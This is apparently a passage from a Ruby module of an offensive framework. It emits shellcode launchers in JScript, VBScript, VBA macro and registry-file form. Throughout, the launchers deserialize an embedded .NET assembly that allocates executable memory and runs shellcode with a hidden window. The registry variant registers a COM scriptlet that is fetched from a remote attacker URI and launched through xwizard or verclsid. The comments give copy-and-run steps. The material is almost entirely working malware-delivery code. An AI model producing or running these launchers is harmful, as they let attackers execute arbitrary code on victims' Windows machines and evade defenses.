"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAACA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'meta';

try {
        setversion();
        var stm = base64ToStream(serialized_obj);
        var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
        var al = new ActiveXObject('System.Collections.ArrayList');
        var d = fmt.Deserialize_2(stm);
        al.Add(undefined);
        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
        o.sc_in(enc);
} catch (e) {
    debug(e.message);
}
    HEREDOC
  end


  def vbscript
    esc = build_payload
    <<-HEREDOC
'Copy the entire contents of this page to a file named vbscript.vbs
'Execute using: C:\\Windows\\System32\\cscript.exe vbscript.vbs
'or
'Execute using: C:\\Windows\\System32\\wscript.exe vbscript.vbs


Dim enc : enc = "#{esc}"
Sub DebugPrint(s)
End Sub

Sub SetVersion
Dim shell
Set shell = CreateObject("WScript.Shell")
Dim ver
ver = "v4.0.30319"
On Error Resume Next
shell.RegRead "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\"
If Err.Number <> 0 Then
  ver = "v2.0.50727"
  Err.Clear
End If
shell.Environment("Process").Item("COMPLUS_Version") = ver
End Sub

Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAiZVjWgAAAAAA"
s = s & "AAAA4AAiIAsBMAAADAAAAAYAAAAAAAAeKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"
s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAzCkA"
s = s & "AE8AAAAAQAAAWAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJQoAAAcAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
s = s & "AAAALnRleHQAAAAkCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAWAMAAABA"
s = s & "AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"
s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAqAAAAAAAASAAAAAIABQDwIAAApAcAAAEAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAGAGwAAAAB"
s = s & "AAARACgFAAAGCgYWKAQAAAYmAwsHKA4AAAoMCA1+DwAACgmOaWooEAAACn4BAAAEfgIAAAQoAQAA"
s = s & "BhMECRYRBAmOaSgRAAAKAH4PAAAKEwURBX4SAAAKEQQRBRYSBSgCAAAGfgMAAAQoAwAABiYqIgIo"
s = s & "EwAACgAqdiAAEAAAgAEAAAQfQCgUAAAKgAIAAAQVgAMAAAQqAEJTSkIBAAEAAAAAAAwAAAB2Mi4w"
s = s & "LjUwNzI3AAAAAAUAbAAAAAQDAAAjfgAAcAMAAAQDAAAjU3RyaW5ncwAAAAB0BgAABAAAACNVUwB4"
s = s & "BgAAEAAAACNHVUlEAAAAiAYAABwBAAAjQmxvYgAAAAAAAAACAAABVx0CFAkAAAAA+gEzABYAAAEA"
s = s & "AAATAAAAAgAAAAUAAAAIAAAADwAAABQAAAACAAAADgAAAAEAAAADAAAABQAAAAEAAAABAAAAAAAB"
s = s & "AgEAAAAAAAYAUAF3AgYAvQF3AgYAnQBFAg8AlwIAAAYAxQAXAgYAMwEXAgYAFAEXAgYApAEXAgYA"
s = s & "cAEXAgYAiQEXAgYA3AAXAgYAsQBYAgYAjwBYAgYA9wAXAgYAtgIKAgYAyQIKAgYAPgIKAgYAPQIK"
s = s & "AgYA7gFYAgAAAAATAAAAAAABAAEAAQAQAFoAAAA9AAEAAQARAEQAVwARAC0AKwARACQAWgBRgBwA"
s = s & "VwBRgE8AVwAAAAAAgACRIGgAXQABAAAAAACAAJEgdQBlAAUAAAAAAIAAkSCpAnAACwAAAAAAgACR"
s = s & "IOkCdgANAAAAAACAAJEg2AJ8AA8AUCAAAAAAhgARAhAADwDIIAAAAACGGDACBgAQANEgAAAAAJEY"
s = s & "NgKAABAAAAABAF0AAAACAKcCAAADANYCAAAEAC4CAAABANQCAAACANECAAADAFcAAAAEAC4CAAAF"
s = s & "AHMAAAAGAIIAAAABAOwBAAACAKYCAAABAIUAAAACAPQCAAABAIoACQAwAgEAEQAwAgYAGQAwAgoA"
s = s & "KQAwAhAAMQAwAhAAOQAwAhAAQQAwAhAASQAwAhAAUQAwAhAAWQAwAhAAYQAwAhUAaQAwAhAAcQAw"
s = s & "AhAAgQDbASUAiQApAisAkQC9Ai4AmQD9AjMAkQApAjwAeQAwAgYAiQC9Aj8ACAAQAE0ACAAUAFIA"
s = s & "LgALAIQALgATAI0ALgAbAKwALgAjALUALgArAL8ALgAzAL8ALgA7AL8ALgBDALUALgBLAMUALgBT"
s = s & "AL8ALgBbAL8ALgBjAN0ALgBrAAcBQwBbABQBGgAKAPYBAQAAAQMAaAABAAABBQB1AAEAAAEHAKkC"
s = s & "AQAAAQkA6QICAAABCwDYAgMABIAAAAEAAAAAAAAAAAAAAAAAWgAAAAIAAAAAAAAAAAAAAEQAXwAA"
s = s & "AAAAAAAAS2VybmVsMzIAa2VybmVsMzIAPE1vZHVsZT4AU1dfSElERQBJTkZJTklURQBQQUdFX0VY"
s = s & "RUNVVEVfUkVBRFdSSVRFAE1FTV9DT01NSVQAU1dfU0hPVwBzYQBtZXRhAG1zY29ybGliAFZpcnR1"
s = s & "YWxBbGxvYwBDcmVhdGVUaHJlYWQAaWQAaFduZABjb2RlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJs"
s = s & "ZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNz"
s = s & "ZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3Nl"
s = s & "bWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBD"
s = s & "b21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBB"
s = s & "c3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGlt"
s = s & "ZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARnJvbUJhc2U2NFN0cmluZwBoAE1hcnNoYWwAdXNlcjMy"
s = s & "LmRsbABtZXRhLmRsbABTeXN0ZW0Ac2NfaW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBwAC5jdG9y"
s = s & "AC5jY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9w"
s = s & "U2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBt"
s = s & "cwBXYWl0Rm9yU2luZ2xlT2JqZWN0AG9wX0V4cGxpY2l0AENvbnZlcnQAc3QAYXR0AEdldENvbnNv"
s = s & "bGVXaW5kb3cAU2hvd1dpbmRvdwBuQ21kU2hvdwBDb3B5AAAAAAAAAMFKLNHGIn1OtOxKclz5L1cA"
s = s & "BCABAQgDIAABBSABARERBCABAQ4EIAEBAgoHBhgOHQUdBRgYBQABHQUOAgYYBAABGQsIAAQBHQUI"
s = s & "GAgCBhkEAAEYCAi3elxWGTTgiQQAAAAABAUAAAACBggCBgkHAAQYGBkIGAoABhgYGRgYCBAYBQAC"
s = s & "CRgJBQACAhgIAwAAGAMAAAEIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB"
s = s & "CAEABwEAAAAACQEABG1ldGEAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTgAACkBACQ4NjY0"
s = s & "NzhhNi1jMWQyLTRlZWUtODU0ZS1kMzRkYWRjZjYwNjkAAAwBAAcxLjAuMC4wAAAFAQABAAAAAAAA"
s = s & "AACIlWNaAAAAAAIAAAAcAQAAsCgAALAKAABSU0RTooN9OKxGU0660BHQ1HwMZwEAAABDOlxVc2Vy"
s = s & "c1xOaWNrXHNvdXJjZVxyZXBvc1xtZXRhXG1ldGFcb2JqXERlYnVnXG1ldGEucGRiAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPQpAAAAAAAAAAAAAA4qAAAAIAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAKgAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"
s = s & "AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAD8AgAAAAAAAAAAAAD8AjQAAABW"
s = s & "AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"
s = s & "PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"
s = s & "AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEXAIAAAEAUwB0AHIAaQBuAGcA"
s = s & "RgBpAGwAZQBJAG4AZgBvAAAAOAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBl"
s = s & "AG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAADIABQABAEYA"
s = s & "aQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABtAGUAdABhAAAAAAAwAAgAAQBGAGkAbABl"
s = s & "AFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAAyAAkAAQBJAG4AdABlAHIAbgBhAGwA"
s = s & "TgBhAG0AZQAAAG0AZQB0AGEALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBp"
s = s & "AGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATABlAGcA"
s = s & "YQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAAA6AAkAAQBPAHIAaQBnAGkAbgBhAGwARgBp"
s = s & "AGwAZQBuAGEAbQBlAAAAbQBlAHQAYQAuAGQAbABsAAAAAAAqAAUAAQBQAHIAbwBkAHUAYwB0AE4A"
s = s & "YQBtAGUAAAAAAG0AZQB0AGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAA"
s = s & "ADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAA"
s = s & "MQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAACA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"
s = s & "ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"
entry_class = "meta"

Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
o.sc_in(enc)
End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  DebugPrint Err.Description
  Err.Clear
End If
    HEREDOC
  end


  def com
    <<-HEREDOC
Windows Registry Editor Version 5.00
;Copy the entire contents of this page to a file named reg_add.reg and double click
;Execute using: C:\\Windows\\System32\\xwizard.exe RunWizard {4046FD70-3F5B-4EDA-AAEE-3E147862CF21}
;or
;Execute using: C:\\Windows\\System32\\verclsid.exe /S /C {4046FD70-3F5B-4EDA-AAEE-3E147862CF21}


[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}]
@=\"meta\"
[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}\\InprocServer32]
@=\"C:\\\\WINDOWS\\\\system32\\\\scrobj.dll\"
\"ThreadingModel\"=\"Apartment\"
[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}\\ProgID]
@=\"meta\"
[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}\\ScriptletURL]
@=\"#{get_uri.chomp("/")}/RUNDLL\"
[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}\\VersionIndependentProgID]
@=\"meta\"
    HEREDOC
  end


  def vba
   esc = build_payload
    <<-HEREDOC
'Copy the entire contents of this page to a vba macro
'Execute by clicking the run button
'NOTE: This bypass requires Microsoft .NET 3.5 to be installed


Sub DebugPrint(s)
End Sub

Sub SetVersion
Dim shell
Set shell = CreateObject("WScript.Shell")
Dim ver
ver = "v4.0.30319"
On Error Resume Next
shell.RegRead "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\"
If Err.Number <> 0 Then
  ver = "v2.0.50727"
  Err.Clear
End If
shell.Environment("Process").Item("COMPLUS_Version") = ver
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()
    Dim enc as string
    enc = "#{esc}"
    On Error Resume Next

    SetVersion

    Dim serialized_obj
    serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
    serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
    serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
    serialized_obj = serialized_obj & "666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44"
    serialized_obj = serialized_obj & "656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    serialized_obj = serialized_obj & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A"
    serialized_obj = serialized_obj & "6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C6567617465536572"
    serialized_obj = serialized_obj & "69616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056"
    serialized_obj = serialized_obj & "657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237"
    serialized_obj = serialized_obj & "376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    serialized_obj = serialized_obj & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C"
    serialized_obj = serialized_obj & "697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374"
    serialized_obj = serialized_obj & "656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    serialized_obj = serialized_obj & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C"
    serialized_obj = serialized_obj & "000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A"
    serialized_obj = serialized_obj & "6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    serialized_obj = serialized_obj & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E54797065"
    serialized_obj = serialized_obj & "5B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B65"
    serialized_obj = serialized_obj & "2853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    serialized_obj = serialized_obj & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E30"
    serialized_obj = serialized_obj & "2E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530"
    serialized_obj = serialized_obj & "383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    serialized_obj = serialized_obj & "6C790617000000044C6F61640A0F0C00000000140000024D5A90000300000004000000FFFF0000B800000000000000400000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD"
    serialized_obj = serialized_obj & "21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    serialized_obj = serialized_obj & "00504500004C0103008995635A0000000000000000E00022200B013000000C000000060000000000001E2A00000020000000"
    serialized_obj = serialized_obj & "4000000000001000200000000200000400000000000000040000000000000000800000000200000000000003004085000010"
    serialized_obj = serialized_obj & "0000100000000010000010000000000000100000000000000000000000CC2900004F00000000400000580300000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000006000000C000000942800001C0000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E"
    serialized_obj = serialized_obj & "74657874000000240A000000200000000C000000020000000000000000000000000000200000602E72737263000000580300"
    serialized_obj = serialized_obj & "000040000000040000000E0000000000000000000000000000400000402E72656C6F6300000C000000006000000002000000"
    serialized_obj = serialized_obj & "1200000000000000000000000000004000004200000000000000000000000000000000002A00000000000048000000020005"
    serialized_obj = serialized_obj & "00F0200000A40700000100000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000133006006C000000010000110028050000060A0616280400000626030B07280E00000A"
    serialized_obj = serialized_obj & "0C080D7E0F00000A098E696A281000000A7E010000047E020000042801000006130409161104098E69281100000A007E0F00"
    serialized_obj = serialized_obj & "000A130511057E1200000A1104110516120528020000067E030000042803000006262A2202281300000A002A762000100000"
    serialized_obj = serialized_obj & "80010000041F40281400000A80020000041580030000042A0042534A4201000100000000000C00000076322E302E35303732"
    serialized_obj = serialized_obj & "370000000005006C00000004030000237E0000700300000403000023537472696E6773000000007406000004000000235553"
    serialized_obj = serialized_obj & "0078060000100000002347554944000000880600001C01000023426C6F620000000000000002000001571D02140900000000"
    serialized_obj = serialized_obj & "FA01330016000001000000130000000200000005000000080000000F00000014000000020000000E00000001000000030000"
    serialized_obj = serialized_obj & "00050000000100000001000000000001020100000000000600500177020600BD01770206009D0045020F00970200000600C5"
    serialized_obj = serialized_obj & "0017020600330117020600140117020600A40117020600700117020600890117020600DC0017020600B100580206008F0058"
    serialized_obj = serialized_obj & "020600F70017020600B6020A020600C9020A0206003E020A0206003D020A020600EE01580200000000130000000000010001"
